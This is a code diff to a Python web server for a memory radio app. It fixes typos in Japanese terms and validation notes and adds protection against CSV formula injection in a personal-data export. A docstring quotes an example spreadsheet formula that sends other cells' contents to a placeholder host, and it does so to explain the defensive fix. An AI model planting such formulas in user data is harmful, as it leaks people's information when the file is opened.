@@ -21,10 +21,10 @@
 ここで/server.py の `GenerateRequest` を書き換えるのではなく、
 **同じ制約をサーバー側のバリデーションとして用意する**（UI 文言は S9 の管轄）。
 
-- [`normalize_target_name`]: 空白・制御文字・見出しマ—in を弾き、**最大 16 文字**に切詰。
+- [`normalize_target_name`]: 空白・制御文字・見出しマーカーを弾き、**最大 16 文字**に切詰。
 - [`validate_anniversary_input`]: `anniversary` モードでは
   「ニックネーム + 出生年のみ」を要求し、`month` / `day` を**任意**にする。
-  日付指定が来ても**捨てて**年のrequirementに縮める（黙って無視はしない）。
+  日付指定が来ても**捨てて**年の指定に縮める（黙って無視はしない）。
 
 **法的解釈ではない**: 個人情報保護法の適用範囲・同意取得の適法性は
  counsel による確認が必要。`docs/privacy_and_tenancy.md` を参照。
@@ -118,12 +118,12 @@ class TermsResponse(BaseModel):
 #: 利用規約の本文（1 ページ想定）。
 #: **法的助言ではない**。施設導入前に counsel による確認を受けること。
 TERMS_BODY = """\
-このアプリケーションは、思い出のラジオ番組を生成するための_expectedツールです。
+このアプリケーションは、思い出のラジオ番組を生成するためのツールです。
 
 ## 1. 取得する情報
 - ニックネーム（回想の対象を呼ぶため。**本名を入力しないでください**）
-- 出生年（そのteesの曲を選ぶため。**月日は入力不要です**）
-- あなたが選んだ曲・お按键の反応
+- 出生年（その年の曲を選ぶため。**月日は入力不要です**）
+- あなたが選んだ曲・お好みの反応
 - 生成した番組の履歴
 
 ## 2. 利用目的
@@ -142,7 +142,7 @@ TERMS_BODY = """\
 TERMS_DATA_CATEGORIES = [
     "ニックネーム（呼称）",
     "出生年",
-    "選曲・お按键（曲名・アーティスト・反応）",
+    "選曲・お偏好（曲名・アーティスト・反応）",
     "生成履歴（年・月・日・原稿・曲）",
     "同意記録",
 ]
@@ -511,14 +511,47 @@ def export_me(
     )
 
 
+#: Excel / Google Sheets / LibreOffice が**数式として解釈**する前置文字。
+#: `csv.QUOTE_ALL` は値を必ず引用符で包むが、**数式の実行は防げない**。
+#: 先頭がこれらの文字なら `'` を前置して**文字列として扱う**ようにする。
+_CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_safe(value: Any) -> str:
+    """CSV の 1 セルを、数式解釈されない文字列にして返す。
+
+    Notes
+    -----
+    `csv.QUOTE_ALL` は「引用符で包む」だけで**数式の実行を抑止しない**。
+    利用者が自分で登録した曲名（`POST /api/me/music-profile/tracks` は
+    最大 500 文字・内容検証なし）に
+    ``=HYPERLINK("https://x/?d="&A1,"x")`` を書けており、
+    Excel で開いた瞬間に**同じファイル内の他の列が漏れる**。
+    開示 CSV は利用者自身が施設管理者や開示請求担当者に
+    **そのまま渡す**ものなので、この経路は現実に近い。
+
+    Excel はセル値が `'` で始まる場合、その**値**として扱う（`'` は表示されない）。
+    よって前置すれば値は保持したまま実行だけ防げる。
+    """
+    if value is None:
+        return ""
+    text = str(value)
+    if text[:1] in _CSV_FORMULA_PREFIXES:
+        return "'" + text
+    return text
+
+
 def _to_csv(payload: Dict[str, Any]) -> str:
-    """開示データを CSV にする（1 行 = 1 レコード、複数種別を `種別` で区別）。"""
+    """開示データを CSV にする（1 行 = 1 レコード、複数種別を `種別` で区別）。
+
+    すべてのセルは :func:`_csv_safe` を通す（数式解釈の抑止）。
+    """
     output = io.StringIO()
     writer = csv.writer(output, quoting=csv.QUOTE_ALL)
-    writer.writerow(EXPORT_CSV_HEADER)
+    writer.writerow([_csv_safe(h) for h in EXPORT_CSV_HEADER])
 
     for gen in payload.get("generations", []):
-        writer.writerow([
+        writer.writerow([_csv_safe(v) for v in [
             "generation",
             gen.get("id", ""),
             gen.get("year", ""),
@@ -528,10 +561,10 @@ def _to_csv(payload: Dict[str, Any]) -> str:
             gen.get("artist_name", ""),
             "", "", "", "", "", "",
             gen.get("created_at").isoformat() if gen.get("created_at") else "",
-        ])
+        ]])
 
     for track in payload.get("favorite_tracks", []):
-        writer.writerow([
+        writer.writerow([_csv_safe(v) for v in [
             "favorite_track",
             track.get("id", ""),
             "", "", "",
@@ -542,17 +575,17 @@ def _to_csv(payload: Dict[str, Any]) -> str:
             track.get("last_played_at", ""),
             "", "", "",
             "",
-        ])
+        ]])
 
     for consent in payload.get("consents", []):
-        writer.writerow([
+        writer.writerow([_csv_safe(v) for v in [
             "consent",
             "", "", "", "", "", "", "", "", "",
             consent.get("terms_version", ""),
             consent.get("accepted_at", ""),
             consent.get("withdrawn_at", ""),
             "",
-        ])
+        ]])
     return output.getvalue()
 
 
@@ -638,7 +671,7 @@ def upsert_music_track(
     body: TrackRequest,
     principal: Principal = Depends(require_consent),
 ):
-    """favorite  registering / 更新する。"""
+    """favorite を登録 / 更新する。"""
     if not principal.user_id:
         raise HTTPException(
             status_code=status.HTTP_409_CONFLICT,
